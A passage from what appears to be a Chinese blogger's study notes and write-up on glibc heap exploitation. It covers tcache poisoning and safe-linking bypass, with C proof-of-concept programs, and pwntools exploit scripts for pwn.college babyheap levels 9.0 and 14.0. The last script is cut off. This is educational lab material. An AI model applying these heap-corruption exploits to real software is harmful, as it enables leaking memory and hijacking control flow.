<p>这种状态<strong>可以看作</strong><code>tcache</code>从<strong>空</strong>到先<code>free(fake_chunk)</code>然后<code>free(chunk2)</code>之后的状态,诚如是,可以从头开始考虑:</p>
<p>在<code>free(fake_chunk)</code>之后,<code>tcache</code>中的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 1</span><br><span class="line">tcache.entries[idx] =&gt; fake_chunk</span><br></pre></td></tr></table></figure>
<p>此时<code>free(chunk2)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (fake_chunk_mem)</span><br></pre></td></tr></table></figure>
<p>又<code>chunk2_mem &gt;&gt; 12</code>就是<code>chunk2</code>的虚拟页框号,其值等于<code>chunk1.next</code>,因此可以在<code>fake_chunk</code>上链前,先计算得知该值</p>
<p>又<code>fake_chunk_mem</code>是我们已知的目标地址,</p>
<p>因此<code>chunk2.next</code>计算可得</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// size_t PROTECTED_PTR (size_t pos,size_t ptr)&#123;</span></span><br><span class="line"><span class="comment">//   return ((pos &gt;&gt; 12) ^ ptr);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//结构体自动对齐到sizeof(tcache_entry) = 0x10</span></span><br><span class="line">  <span class="type">size_t</span> * next;</span><br><span class="line">  <span class="type">size_t</span> key;</span><br><span class="line">&#125;tcache_entry;</span><br><span class="line"></span><br><span class="line">tcache_entry fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;</span><br><span class="line">  <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">  fake_chunk.next = <span class="number">0xcafebabe</span>;</span><br><span class="line">  fake_chunk.key = <span class="number">0xdeadbeef</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk @ %p\n&quot;</span>,&amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);</span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line"></span><br><span class="line">  chunk2[<span class="number">0</span>] = chunk1[<span class="number">0</span>] ^ (<span class="type">size_t</span>)(&amp;fake_chunk);</span><br><span class="line">  </span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  victim = (tcache_entry *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">  assert(victim == &amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# gcc safe_poison.c -o safe_poison -g -w</span><br><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# ./safe_poison    </span><br><span class="line">fake_chunk @ 0x55fe8ca46020</span><br><span class="line">victim = 0x55fe8ca46020</span><br></pre></td></tr></table></figure>
<h5 id="safe-linking-metadata-poisoning-memory-leak">[safe-linking]
metadata poisoning memory leak</h5>
<p>使用<code>tcache entry poisoning</code>之后一直<code>malloc</code>把假堆块拿出来</p>
<p>此时<code>fake_chunk.next</code>值会被“解密”然后挂载<code>tcache.entries[idx]</code></p>
<p>具体过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] =&gt; fake_chunk -&gt; fake_chunk.next</span><br></pre></td></tr></table></figure>
<p>当<code>fake_chunk</code>要从链条上拿走时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]	//ep就是桶子头</span><br><span class="line">e = *ep				//e 就是fake_chunk</span><br><span class="line">*ep = REVEAL_PTR(e-&gt;next);		//新ep指向</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR(fake_chunk-&gt;next)</span><br><span class="line">						= ( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next</span><br></pre></td></tr></table></figure>
<p>我们想要泄露的是<code>fake_chunk.next</code>,</p>
<p>现在我们知道的是<code>fake_chunk_addr</code></p>
<p>还需要知道一个<code>tcache-&gt;entries[tc_idx]</code></p>
<p>接下来再释放一个堆块<code>chunk0</code>进入<code>tcache</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0.next = PROTECT_PTR(chunk0_addr,tcache-&gt;entries[tc_idx])</span><br><span class="line">			= ( chunk0_addr &gt;&gt; 12 ) ^ [( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next]</span><br></pre></td></tr></table></figure>
<p>因此最终得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk.next = chunk0.next ^ (chunk0 &gt;&gt; 12) ^ (fake_chunk_addr &gt;&gt; 12)</span><br></pre></td></tr></table></figure>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> flag_low;</span><br><span class="line">    <span class="type">size_t</span> flag_high;</span><br><span class="line">&#125;Secret;</span><br><span class="line"></span><br><span class="line">Secret secret=&#123;</span><br><span class="line">    .flag_low = <span class="number">0x0011223344556677</span>,</span><br><span class="line">    .flag_high = <span class="number">0x8899aabbccddeeff</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print_secret</span><span class="params">(Secret *s)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret @ %p\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_low = %p\n&quot;</span>, s-&gt;flag_low);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_high = %p\n&quot;</span>, s-&gt;flag_high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk0;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line">    <span class="type">size_t</span> chunk0_next;</span><br><span class="line">    <span class="type">size_t</span> chunk1_next;</span><br><span class="line">    <span class="type">size_t</span> chunk2_next;</span><br><span class="line">    <span class="type">size_t</span> ep;</span><br><span class="line">    <span class="type">size_t</span> leak;</span><br><span class="line"></span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1_next = chunk1[<span class="number">0</span>];         <span class="comment">//chunk1_next = page number</span></span><br><span class="line">    chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">    chunk2[<span class="number">0</span>] = chunk1_next ^ (<span class="type">size_t</span>)(&amp;secret);</span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">// remove secret.flag_high</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    chunk0_next = chunk0[<span class="number">0</span>];</span><br><span class="line">    ep = chunk1_next ^ chunk0_next;         <span class="comment">//tcache entry</span></span><br><span class="line">    leak = ep ^ ((<span class="type">size_t</span>)(&amp;secret)&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak = %p\n&quot;</span>, leak);</span><br><span class="line">    print_secret(&amp;secret);</span><br><span class="line">    assert(leak == secret.flag_low);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# gcc safe_metadata.c -o safe_metadata -g -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# ./safe_metadata</span><br><span class="line">leak = 0x11223344556677</span><br><span class="line">secret @ 0x5599e7a02030</span><br><span class="line">secret.flag_low = 0x11223344556677</span><br><span class="line">secret.flag_high = (nil)</span><br></pre></td></tr></table></figure>
<p>注意glibc2.35之后堆块的对齐要求, 堆块的地址必须是0x10对齐的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line">	<span class="comment">//MALLOC_ALIGN_MASK = 0xf</span></span><br></pre></td></tr></table></figure>
<p>但是glibc2.31及之前是可以对齐到0x8的</p>
<h3 id="glibc-2.35">glibc-2.35</h3>
<p>ubuntu22.04上使用glibc-2.35,其数据结构与算法基本上和glibc2.38相</p>
<h2 id="pwn.college">pwn.college</h2>
<table>
<thead>
<tr>
<th>ubuntu发行版</th>
<th>glibc版本</th>
<th>调试工具</th>
</tr>
</thead>
<tbody>
<tr>
<td>16.04</td>
<td>2.23</td>
<td>gef</td>
</tr>
<tr>
<td>18.04</td>
<td>2.27</td>
<td>pwndbg for ubuntu18.04</td>
</tr>
<tr>
<td>20.04</td>
<td>2.31</td>
<td>pwndbg for ubuntu20.04</td>
</tr>
<tr>
<td>22.04</td>
<td>2.35</td>
<td>pwndbg</td>
</tr>
</tbody>
</table>
<blockquote>
<p>pwndbg for ubuntu18.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 71c4e1d</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<p>pwndbg for ubuntu20.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 26ba400</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="level1---uaf">level1 - UAF</h3>
<h3 id="level2--">level2 -</h3>
<h3 id="level9.0">level9.0</h3>
<p><code>secret</code>位于 <code>0x427C72</code></p>
<p>然而<code>malloc</code>检查地址必须在<code>0x430000</code>之上</p>
<p>如此一来,
<strong>通过<code>UAF tcache poisoning</code>把<code>0x427C72</code>作为假堆块挂到<code>tcache</code>中,
然后<code>malloc</code>拿出来打印其内容</strong>的思路就失效了,
因为<code>malloc</code>不让我们拿出这个假堆块来</p>
<p>虽然我们拿不出假堆块来,但是投毒会传染给元数据</p>
<p><strong>具体来说:</strong></p>
<p>1.通过<code>UAF</code>对<code>tcache</code>中的真堆块投毒,使得
<strong>假堆块@0x427C72</strong> 进入<code>tcache</code></p>
<p>2.<code>malloc</code>拿出真堆块</p>
<p>3.<code>malloc</code>拿出假堆块,</p>
<p>此时假堆块的<code>next</code>值,就是<code>secret[0-7]</code></p>
<p>此时假堆块的<code>key</code>值,就是<code>secret[8-15]</code></p>
<p><code>tcache</code>元数据会继承 <strong>假堆块.next</strong>,</p>
<p>并且假堆块在被重新分配时,<code>key</code>值会被置零,也就是说<code>secret[8-15] = 0</code></p>
<p>4.重复上述步骤,但是这次<strong>假堆块@0x427C72 - 8</strong></p>
<p>如此<code>secret[0-7]</code>也会被置0</p>
<p>如此一来,我们根本不需要知道<code>secret</code>是多少,直接放零蛋</p>
<blockquote>
<p>glibc2.31中,tcache的堆块不会有对齐要求</p>
<p>同样的思路在glibc2.35上就更加困难了,一个是有safe-linking
,二个是tcache堆块必须对齐到0x10</p>
<p>glibc2.35中可以泄露低8字节,归零高8字节</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_level9.0&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;/challenge/babyheap_level9.0&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    size=<span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index,size = <span class="number">0</span></span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;You win! Here is your flag:\n&#x27;</span>)</span><br><span class="line">    flag = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    scanf(<span class="number">0</span>,p64(addr))</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x10</span>)          <span class="comment"># get fake_chunk out of tcache</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    data = puts(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x427C72</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># secret_high = leak(secret_addr+8)       # no need to know secret_high which will be overwritten to zero by the next step</span></span><br><span class="line">leak(secret_addr)          <span class="comment"># secret_high will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line">leak(secret_addr - <span class="number">8</span>)      <span class="comment"># secret_low will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#secret was reset to 0 after 2 leak</span></span><br><span class="line">secret = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">send_flag(secret)</span><br></pre></td></tr></table></figure>
<h3 id="level14.0">level14.0</h3>
<p>程序中有一个<code>win</code>函数，可以<code>ret2text</code></p>
<p>但是程序开启了<code>pie</code>保护，因此需要先泄露<code>pie base</code></p>
<p>允许堆栈上溢出构造假堆块，并<code>free</code>进入<code>tcache</code>,</p>
<p>由于栈上有<code>canary</code>并且溢出长度有限,
因此需要利用假堆块进行泄露或者篡改返回地址</p>
<blockquote>
<p>buffer视角:</p>
<table>
<thead>
<tr>
<th></th>
<th>offset</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>低</td>
</tr>
<tr>
<td><strong>buffer</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td><strong>chunk_mem</strong></td>
<td><strong>+ 0x40</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>==buffer_end==</td>
<td>+ 0x7f</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x168</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody>
</table>
<p>堆块视角:</p>
<table>
<thead>
<tr>
<th>prev_size</th>
<th>- 0x10</th>
<th>低</th>
</tr>
</thead>
<tbody>
<tr>
<td>size</td>
<td>- 0x8</td>
<td></td>
</tr>
<tr>
<td><strong>chunkmem</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x58</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x128</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody>
</table>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usable_size = 0x130</span><br><span class="line">chunk_size = (0x130+0x10) | 1 = 0x141</span><br></pre></td></tr></table></figure>
<p>此时<code>chunkmem + 0x48</code>处是<code>main</code>栈帧中的<code>canary</code>所在地</p>
<p>此时<code>chunkmem + 0x58</code>处是<code>main</code>函数的返回地址,
正常情况下是<code>__libc_start_main+243 @ glibc</code>处</p>
<p>此时<code>chunkmem + 0x128</code>处是<code>__libc_start_main</code>函数返回地址,
正常情况下是<code>_start+46 @ babylevel14.0</code>处</p>
<p>正好两个地址一个可以泄露<code>libc_base</code>,
一个可以泄露<code>pie_base</code>, 当然,
本题中只需要泄露<code>pie_base</code></p>
<p>接下来就可以在<code>chunkmem</code>上溢出</p>
<p>综上</p>
<p>1.在堆栈上构造假堆块, 大小涵盖两个返回地址</p>
<p>2.下一次<code>malloc</code>拿到假堆块,
打印泄露<code>canary</code>和两个返回地址,
计算得到<code>pie_base</code></p>
<p>3.在假堆块上溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level14.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level14.0&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span 